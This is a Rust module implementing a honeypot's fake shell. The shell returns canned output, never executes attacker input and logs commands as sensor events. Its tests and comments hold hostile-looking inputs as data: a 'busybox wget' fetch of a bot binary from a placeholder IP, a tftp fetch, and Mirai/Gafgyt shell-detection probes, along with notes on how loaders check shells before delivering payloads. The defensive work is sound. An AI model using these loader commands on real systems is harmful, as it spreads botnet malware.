//! The fake interactive shell (Task 13) presented to an attacker after SSH authentication
//! succeeds. Originally part of `sensor-ssh`; moved here (Task 1 of the remaining-sensors plan)
//! so `sensor-telnet`/`sensor-adb` can reuse it without depending on sensor-ssh. See "Fake
//! shell", "Never-exec", and "No attacker-directed fetch" in
//! `internal/design/02-sensor-framework.md`: this module sits on the two highest-priority
//! security surfaces in the platform, and both governing invariants are enforced by
//! construction, not by care.
//!
//! **Never-exec.** No file in this crate's `src/`, nor in `sensor-ssh`'s, imports a
//! process-spawning facility: no `Command` type pulled in from `std`'s `process` module, no
//! `exec`-family call, no dynamic evaluation of any kind. Every command below returns a
//! hand-written, static or lightly-interpolated string; there is no code path from an
//! attacker-typed byte to a real shell, syscall, or interpreter. `never_exec_static_check` in
//! `sensor-ssh`'s `tests/shell_test.rs` asserts this at the source level (as plain substring
//! matches, so this doc comment is deliberately phrased to describe those APIs without spelling
//! out their exact paths) across every file in both crates' `src/`, not just this one.
//!
//! **No attacker-directed fetch.** `wget`/`curl` return a canned transcript and perform zero
//! network I/O. This is guaranteed the same way never-exec is: this crate (and the whole
//! workspace) depends on no HTTP or generic network-fetch client, so there is nothing present
//! capable of making the request even if a future change tried to. `tests/shell_test.rs`'s
//! `workspace_lockfile_has_no_http_client_crate` asserts the fully-resolved workspace lockfile
//! names none; Task 14's `no_outbound_connection` integration test verifies the same thing at
//! runtime, across a live session.
//!
//! Every attacker-controlled byte this module embeds in a `SensorEvent` clears
//! `sensor_framework::sanitize_value` first - the same chokepoint `auth.rs` and `channel.rs`
//! route through - so a command line can never forge a second wire record via an embedded CR/LF
//! or ANSI escape.

use std::net::IpAddr;

use sensor_wire::{
    PROTO_TCP, SIGNAL_HONEYPOT_COMMAND_EXEC, SIGNAL_HONEYPOT_FILE_DOWNLOAD, SensorEvent,
    WIRE_VERSION,
};

use crate::fakefs::FakeFs;
use crate::sanitize_value;

/// Cap applied to the sanitized command line captured in `metadata.command`. Matches
/// `auth::MAX_METADATA_STRING_LEN`'s convention of a generous, fixed bound on an
/// attacker-controlled string entering an event.
const MAX_COMMAND_LEN: usize = 1024;

/// Cap applied to the `wget`/`curl` target URL echoed back in canned output. Smaller than
/// `MAX_COMMAND_LEN` since it is one token of the line, not the whole line.
const MAX_URL_LEN: usize = 512;

/// The per-session facts every `honeypot_command_exec` event carries, handed in once at shell
/// construction. Mirrors `auth::AuthState`'s "real parameters, no placeholder" convention:
/// `source_ip`/`wan_ip` are this connection's real attributes. `authenticated` is read from here
/// rather than hardcoded `true` - the shell is only ever reached post-authentication in practice,
/// but a future caller (a pre-auth probe, a non-interactive path) must not have its events
/// silently mis-tagged by a hardcoded value.
///
/// `protocol_label` exists because this shell is shared across protocols (SSH, Telnet, and per
/// the design spec eventually ADB): it names both the emitted event's top-level `sensor` field
/// and its `metadata.protocol_label` entry, so `handle_input` never hardcodes which sensor is
/// driving it. Every current and planned caller uses the same string for both - there is no
/// observed case where a `FakeShell` consumer's `sensor` name differs from its `protocol_label` -
/// so one field covers both rather than two that would only ever be set identically.
pub struct EmitContext {
    pub source_ip: IpAddr,
    pub wan_ip: Option<IpAddr>,
    pub authenticated: bool,
    pub protocol_label: String,
    pub session_id: Option<uuid::Uuid>,
}

/// The fake interactive shell. One instance per SSH session; `cwd` is the only mutable state,
/// tracking a `cd` across calls the way a real shell would.
pub struct FakeShell {
    fs: FakeFs,
    ctx: EmitContext,
    cwd: String,
}

impl FakeShell {
    pub fn new(fs: FakeFs, ctx: EmitContext) -> Self {
        Self {
            fs,
            ctx,
            cwd: "/root".to_string(),
        }
    }

    /// Handle one line of shell input: capture it as a `honeypot_command_exec` event (unless the
    /// line is blank - see below), then return the canned terminal output for a recognized
    /// command, or a `command not found` message for anything else.
    ///
    /// A blank line (empty or whitespace-only) produces neither output nor an event. A bare
    /// keystroke or a terminal keepalive is not "a command" by any real shell's definition, and
    /// counting one would pad `honeypot_command_exec` telemetry with empty-command noise on
    /// every idle newline a client sends. This is the one place this function departs from
    /// "every call captures exactly one event" - called out here since it is the one behavior in
    /// this module not dictated directly by the interface.
    pub fn handle_input(&mut self, line: &str) -> (String, Vec<SensorEvent>) {
        if line.trim().is_empty() {
            return (String::new(), Vec::new());
        }

        let sanitized_cmd = sanitize_value(line, MAX_COMMAND_LEN);
        let event = SensorEvent {
            v: WIRE_VERSION,
            source_ip: self.ctx.source_ip,
            wan_ip: self.ctx.wan_ip,
            sensor: self.ctx.protocol_label.clone(),
            signal_type: SIGNAL_HONEYPOT_COMMAND_EXEC.into(),
            protocol: PROTO_TCP.into(),
            authenticated: self.ctx.authenticated,
            observed_at: chrono::Utc::now(),
            metadata: serde_json::json!({
                "protocol_label": self.ctx.protocol_label,
                "command": sanitized_cmd,
            }),
            sample: None,
            session_id: self.ctx.session_id,
        };

        let parts: Vec<&str> = line.split_whitespace().collect();
        let output = self.dispatch(&parts);

        let mut events = vec![event];

        // `download_target` only returns a real (non-empty) token, so no empty-check is needed.
        if let Some(url) = download_target(&parts) {
            let sanitized_url = sanitize_value(url, MAX_URL_LEN);
            events.push(SensorEvent {
                v: WIRE_VERSION,
                source_ip: self.ctx.source_ip,
                wan_ip: self.ctx.wan_ip,
                sensor: self.ctx.protocol_label.clone(),
                signal_type: SIGNAL_HONEYPOT_FILE_DOWNLOAD.into(),
                protocol: PROTO_TCP.into(),
                authenticated: self.ctx.authenticated,
                observed_at: chrono::Utc::now(),
                metadata: serde_json::json!({
                    "protocol_label": self.ctx.protocol_label,
                    "url": sanitized_url,
                }),
                sample: None,
                session_id: self.ctx.session_id,
            });
        }

        (output, events)
    }

    /// Produce the canned terminal output for one already-tokenized, non-empty command line.
    /// Every arm returns a static or lightly-interpolated string; none evaluates, spawns, or
    /// otherwise interprets `parts` as code - see the module doc.
    fn dispatch(&mut self, parts: &[&str]) -> String {
        match parts.first().copied() {
            Some("uname") => cmd_uname(parts),
            Some("id") => "uid=0(root) gid=0(root) groups=0(root)\n".to_string(),
            Some("whoami") => "root\n".to_string(),
            Some("pwd") => format!("{}\n", self.cwd),
            Some("echo") => cmd_echo(&parts[1..]),
            Some("cat") => self.cmd_cat(parts),
            Some("ls") => self.cmd_ls(parts),
            Some("wget") => cmd_wget(parts),
            Some("curl") => cmd_curl(),
            // Shell-availability fingerprint: every real system has /bin/sh, so "command not found"
            // for sh/bash instantly outs the honeypot and the dropper leaves. Model a nested shell.
            Some("sh") | Some("bash") => self.cmd_shell_spawn(parts),
            // The canonical Mirai/Gafgyt probe is `/bin/busybox <TOKEN>`, which they confirm by the
            // exact "<TOKEN>: applet not found" reply; they also fetch payloads via `busybox wget`
            // and `busybox tftp`.
            Some("busybox") => self.cmd_busybox(parts),
            // tftp/ftpget are BusyBox download applets these loaders use; stay quiet (a real
            // non-interactive fetch prints nothing on success) rather than "command not found". The
            // target URL is captured by `download_target` above.
            Some("tftp") | Some("ftpget") => String::new(),
            Some("cd") => {
                self.cwd = first_non_flag_arg(&parts[1..])
                    .unwrap_or("/root")
                    .to_string();
                String::new()
            }
            Some("exit") | Some("logout") => String::new(),
            Some(other) => format!("{other}: command not found\n"),
            None => String::new(),
        }
    }

    fn cmd_cat(&self, parts: &[&str]) -> String {
        match first_non_flag_arg(&parts[1..]) {
            Some(path) => self
                .fs
                .read_file(path)
                .unwrap_or_else(|| format!("cat: {path}: No such file or directory\n")),
            None => String::new(),
        }
    }

    fn cmd_ls(&self, parts: &[&str]) -> String {
        let target = first_non_flag_arg(&parts[1..]).unwrap_or(self.cwd.as_str());
        match self.fs.list_dir(target) {
            Some(entries) if entries.is_empty() => String::new(),
            Some(entries) => entries.join("  ") + "\n",
            None => format!("ls: cannot access '{target}': No such file or directory\n"),
        }
    }

    /// `sh` / `bash`. A nested interactive shell just drops the caller at a new prompt, so a bare
    /// invocation is a no-op that keeps the session in this fake shell (never "command not found").
    /// `sh -c "CMD"` runs CMD in the fake shell, since loaders stage their payload that way.
    fn cmd_shell_spawn(&mut self, parts: &[&str]) -> String {
        let script = parts
            .iter()
            .position(|&p| p == "-c")
            .and_then(|pos| parts.get(pos + 1));
        if let Some(script) = script {
            let inner = strip_one_quote_pair(script);
            let inner_parts: Vec<&str> = inner.split_whitespace().collect();
            if !inner_parts.is_empty() {
                return self.dispatch(&inner_parts);
            }
        }
        String::new()
    }

    /// `busybox`. Bare invocation prints the multi-call banner. `busybox <applet> ...` runs the
    /// applet if it is one this shell models, else returns BusyBox's exact "<applet>: applet not
    /// found" - the reply Mirai/Gafgyt check for to confirm a real busybox before delivering.
    fn cmd_busybox(&mut self, parts: &[&str]) -> String {
        match parts.get(1).copied() {
            None => busybox_banner(),
            Some(applet) if is_busybox_applet(applet) => self.dispatch(&parts[1..]),
            Some(applet) => format!("{applet}: applet not found\n"),
        }
    }
}

/// The download target of a fetch command, or `None` if the line is not one. Covers the direct
/// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
/// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
fn download_target<'a>(parts: &[&'a str]) -> Option<&'a str> {
    const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
    match parts.first().copied() {
        Some(cmd) if FETCHERS.contains(&cmd) => first_non_flag_arg(&parts[1..]),
        Some("busybox") if parts.get(1).is_some_and(|a| FETCHERS.contains(a)) => {
            first_non_flag_arg(&parts[2..])
        }
        _ => None,
    }
}

/// BusyBox applets this shell models, so `busybox <applet>` delegates to the same handler the bare
/// command uses. Anything outside this set returns "applet not found" (the Mirai/Gafgyt tell).
fn is_busybox_applet(name: &str) -> bool {
    matches!(
        name,
        "echo"
            | "cat"
            | "ls"
            | "wget"
            | "id"
            | "whoami"
            | "uname"
            | "pwd"
            | "cd"
            | "sh"
            | "tftp"
            | "ftpget"
    )
}

/// The BusyBox multi-call banner printed by a bare `busybox`. Abbreviated applet list; loaders key
/// off the "applet not found" reply, not this text.
fn busybox_banner() -> String {
    "BusyBox v1.31.1 (2021-06-01 00:00:00 UTC) multi-call binary.\n\
     BusyBox is copyrighted by many authors between 1998-2015.\n\
     \n\
     Usage: busybox [function [arguments]...]\n\
     \n\
     Currently defined functions:\n\
     \tash, base64, cat, chmod, cp, echo, ftpget, id, ls, mkdir, ping, pwd, rm, sh, sleep,\n\
     \ttftp, uname, wget, whoami\n"
        .to_string()
}

fn cmd_uname(parts: &[&str]) -> String {
    if parts.len() > 1 {
        // Any flag at all gets the full banner; this is a canned-response shell, not a faithful
        // per-flag `uname` reimplementation, so `-a`/`-r`/`-s`/... are treated alike.
        "Linux server01 5.15.0-91-generic #101-Ubuntu SMP x86_64 x86_64 x86_64 GNU/Linux\n"
            .to_string()
    } else {
        "Linux\n".to_string()
    }
}

/// `wget URL`: the classic wget banner (connection line, HTTP status, progress bar, final
/// "saved" summary), on stdout/stderr - zero network I/O, see the module doc. The timestamp is
/// real wall-clock time: a frozen or wildly-wrong date is itself a tell an attacker can catch by
/// running the same command twice, which is exactly the kind of self-contradiction the design
/// doc's detectability section warns against.
fn cmd_wget(parts: &[&str]) -> String {
    let url = parts.get(1).copied().unwrap_or("");
    let sanitized_url = sanitize_value(url, MAX_URL_LEN);
    let now = chrono::Utc::now().format("%Y-%m-%d %H:%M:%S");
    format!(
        "--{now}--  {sanitized_url}\n\
         Connecting to {sanitized_url}... connected.\n\
         HTTP request sent, awaiting response... 200 OK\n\
         Length: 1234 (1.2K) [application/octet-stream]\n\
         Saving to: 'index.html'\n\
         \n\
         index.html          100%[==================>]   1.2K  --.-KB/s    in 0s\n\
         \n\
         {now} (1.2 MB/s) - 'index.html' saved [1234/1234]\n"
    )
}

/// `curl URL`: real curl with no `-o`/`-O` writes the fetched body straight to stdout with no
/// banner at all (unlike wget's verbose-by-default transcript) - so, unlike `cmd_wget`, this
/// prints only a plausible fetched body. Zero network I/O either way; the URL itself is still
/// captured (sanitized) as the event's `command` field by the caller.
fn cmd_curl() -> String {
    "<html><head><title>Welcome</title></head><body><h1>It works!</h1></body></html>\n".to_string()
}

/// The first token that does not look like a flag (does not start with `-`), or `None` if every
/// token is a flag or the slice is empty. `ls -la`, `ls -la /tmp`, and `cat -A file` all name
/// their real target after zero or more flags this fake shell has no reason to parse
/// individually; treating the first `-`-prefixed token as the path (what a bare
/// `parts.get(1)` lookup would do) misreads the single most common attacker recon command
/// (`ls -la`) as a lookup for a nonexistent path named `-la`.
fn first_non_flag_arg<'a>(args: &[&'a str]) -> Option<&'a str> {
    args.iter().find(|arg| !arg.starts_with('-')).copied()
}

/// A honeypot `echo` faithful enough to survive the shell-detection handshakes IoT botnets run
/// before they drop a payload. The important one is Gafgyt/BASHLITE, which sends
/// `echo -e "\x47\x41\x59\x46\x47\x54"` and hangs up unless it reads back exactly `GAYFGT`. The
/// previous implementation joined the raw tokens (flags, surrounding quotes, and undecoded escapes
/// included), so that probe returned `-e "\x47\x41\x59\x46\x47\x54"` and fingerprinted the honeypot
/// on the spot. This interprets a leading run of `-e`/`-n`/`-E` flags, removes one pair of matching
/// surrounding quotes per token (the whitespace tokenizer keeps them), and under `-e` decodes the
/// backslash escapes a real `echo -e` would. It only transforms text - nothing here is evaluated or
/// executed, per the module's never-exec guarantee.
fn cmd_echo(args: &[&str]) -> String {
    let mut interpret = false; // -e
    let mut trailing_newline = true; // -n suppresses
    let mut first_operand = 0;
    for (idx, tok) in args.iter().enumerate() {
        // A flag token is '-' followed only by e/n/E (e.g. -e, -n, -E, -en). Anything else, or a
        // bare '-', ends the option run and begins the operands.
        let is_flag = tok.len() >= 2
            && tok.starts_with('-')
            && tok[1..].chars().all(|c| matches!(c, 'e' | 'n' | 'E'));
        if !is_flag {
            first_operand = idx;
            break;
        }
        for c in tok[1..].chars() {
            match c {
                'e' => interpret = true,
                'E' => interpret = false,
                'n' => trailing_newline = false,
                _ => {}
            }
        }
        first_operand = idx + 1;
    }

    let mut out = String::new();
    for (idx, tok) in args[first_operand..].iter().enumerate() {
        if idx > 0 {
            out.push(' ');
        }
        let unquoted = strip_one_quote_pair(tok);
        if interpret {
            if decode_echo_escapes_into(unquoted, &mut out) {
                // A `\c` escape stops all further output, including the trailing newline.
                return out;
            }
        } else {
            out.push_str(unquoted);
        }
    }
    if trailing_newline {
        out.push('\n');
    }
    out
}

/// Remove one pair of matching surrounding quotes (`"..."` or `'...'`) from a token, if present.
/// The fake shell tokenizes on whitespace, so a quoted argument with no internal spaces arrives as
/// a single token still wearing its quotes; a real shell would have stripped them before `echo`.
fn strip_one_quote_pair(tok: &str) -> &str {
    let bytes = tok.as_bytes();
    if bytes.len() >= 2
        && (bytes[0] == b'"' || bytes[0] == b'\'')
        && bytes[bytes.len() - 1] == bytes[0]
    {
        &tok[1..tok.len() - 1]
    } else {
        tok
    }
}

/// Decode the backslash escapes `echo -e` understands, appending to `out`. Returns `true` if a
/// `\c` escape was hit, which tells the caller to stop producing output entirely. Supports the
/// escapes real-world loaders actually use: `\xHH` hex, `\0NNN`/`\NNN` octal, and the single-letter
/// set (`\n \t \r \\ \a \b \f \v \0`).
fn decode_echo_escapes_into(s: &str, out: &mut String) -> bool {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('n') => out.push('\n'),
            Some('t') => out.push('\t'),
            Some('r') => out.push('\r'),
            Some('a') => out.push('\x07'),
            Some('b') => out.push('\x08'),
            Some('f') => out.push('\x0c'),
            Some('v') => out.push('\x0b'),
            Some('\\') => out.push('\\'),
            Some('c') => return true, // stop all further output
            Some('x') => {
                // Up to two hex digits.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 2 {
                    match chars.peek().and_then(|d| d.to_digit(16)) {
                        Some(d) => {
                            val = val * 16 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if n == 0 {
                    out.push_str("\\x"); // not a valid escape: emit literally
                } else if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some('0') => {
                // \0NNN: up to three octal digits after the 0.
                let mut val: u32 = 0;
                let mut n = 0;
                while n < 3 {
                    match chars.peek().and_then(|d| d.to_digit(8)) {
                        Some(d) => {
                            val = val * 8 + d;
                            chars.next();
                            n += 1;
                        }
                        None => break,
                    }
                }
                if let Some(ch) = char::from_u32(val) {
                    out.push(ch);
                }
            }
            Some(other) => {
                // Unknown escape: bash echo -e emits it verbatim (backslash included).
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'), // trailing backslash
        }
    }
    false
}

#[cfg(test)]
mod echo_tests {
    use super::cmd_echo;

    #[test]
    fn gafgyt_handshake_returns_gayfgt() {
        // The exact probe Gafgyt/BASHLITE sends, tokenized as the fake shell would split it:
        // `echo` `-e` `"\x47\x41\x59\x46\x47\x54"`. It must read back "GAYFGT" or the bot hangs up.
        let out = cmd_echo(&["-e", "\"\\x47\\x41\\x59\\x46\\x47\\x54\""]);
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn plain_echo_strips_surrounding_quotes() {
        assert_eq!(cmd_echo(&["\"hello\""]), "hello\n");
        assert_eq!(cmd_echo(&["'world'"]), "world\n");
    }

    #[test]
    fn without_dash_e_escapes_stay_literal() {
        // Default (no -e) and explicit -E both leave backslash escapes untouched.
        assert_eq!(cmd_echo(&["\\x47"]), "\\x47\n");
        assert_eq!(cmd_echo(&["-E", "\"\\x47\""]), "\\x47\n");
    }

    #[test]
    fn dash_n_suppresses_the_trailing_newline() {
        assert_eq!(cmd_echo(&["-n", "hi"]), "hi");
        assert_eq!(cmd_echo(&["-en", "\"\\x41\""]), "A");
    }

    #[test]
    fn decodes_hex_and_octal_escapes_under_dash_e() {
        assert_eq!(cmd_echo(&["-e", "\\x41\\x42"]), "AB\n"); // hex
        assert_eq!(cmd_echo(&["-e", "\\0101"]), "A\n"); // octal 101 = 'A'
        assert_eq!(cmd_echo(&["-e", "a\\tb"]), "a\tb\n"); // tab
    }

    #[test]
    fn dash_c_stops_output_including_newline() {
        assert_eq!(cmd_echo(&["-e", "ab\\cd"]), "ab");
    }

    #[test]
    fn multiple_operands_join_with_single_spaces() {
        assert_eq!(cmd_echo(&["a", "b", "c"]), "a b c\n");
    }

    #[test]
    fn bare_echo_prints_only_a_newline() {
        assert_eq!(cmd_echo(&[]), "\n");
    }
}

#[cfg(test)]
mod shell_detection_tests {
    use super::{
        EmitContext, FakeShell, SIGNAL_HONEYPOT_FILE_DOWNLOAD, download_target, is_busybox_applet,
    };
    use crate::fakefs::FakeFs;

    fn shell() -> FakeShell {
        FakeShell::new(
            FakeFs::new(),
            EmitContext {
                source_ip: "203.0.113.7".parse().unwrap(),
                wan_ip: None,
                authenticated: true,
                protocol_label: "telnet".to_string(),
                session_id: None,
            },
        )
    }

    #[test]
    fn sh_is_never_command_not_found() {
        // Every real system has /bin/sh; "command not found" would out the honeypot instantly.
        let (out, events) = shell().handle_input("sh");
        assert_eq!(out, "");
        assert_eq!(events.len(), 1); // command_exec only, no spurious download
    }

    #[test]
    fn mirai_busybox_probe_returns_applet_not_found() {
        // `/bin/busybox <TOKEN>` is Mirai/Gafgyt's real-shell check; they require the exact
        // "<TOKEN>: applet not found" reply before delivering a payload.
        let (out, _) = shell().handle_input("busybox MIRAI");
        assert_eq!(out, "MIRAI: applet not found\n");
    }

    #[test]
    fn busybox_echo_still_passes_the_gafgyt_handshake() {
        let (out, _) = shell().handle_input("busybox echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"");
        assert_eq!(out, "GAYFGT\n");
    }

    #[test]
    fn sh_dash_c_runs_the_inner_command() {
        let (out, _) = shell().handle_input("sh -c \"id\"");
        assert!(out.contains("uid=0(root)"), "got: {out}");
    }

    #[test]
    fn busybox_wget_is_captured_as_a_download() {
        let (_, events) = shell().handle_input("busybox wget http://198.51.100.9/bins/x86");
        let dl = events
            .iter()
            .find(|e| e.signal_type == SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .expect("busybox wget must emit a file_download event");
        assert_eq!(dl.metadata["url"], "http://198.51.100.9/bins/x86");
    }

    #[test]
    fn download_target_recognizes_direct_and_busybox_forms() {
        assert_eq!(download_target(&["wget", "http://x/y"]), Some("http://x/y"));
        assert_eq!(
            download_target(&["busybox", "tftp", "-g", "-r", "x", "10.0.0.1"]),
            Some("x")
        );
        assert_eq!(download_target(&["busybox", "MIRAI"]), None);
        assert_eq!(download_target(&["ls", "-la"]), None);
    }

    #[test]
    fn busybox_applet_set() {
        assert!(is_busybox_applet("wget"));
        assert!(is_busybox_applet("sh"));
        assert!(!is_busybox_applet("MIRAI"));
    }
}
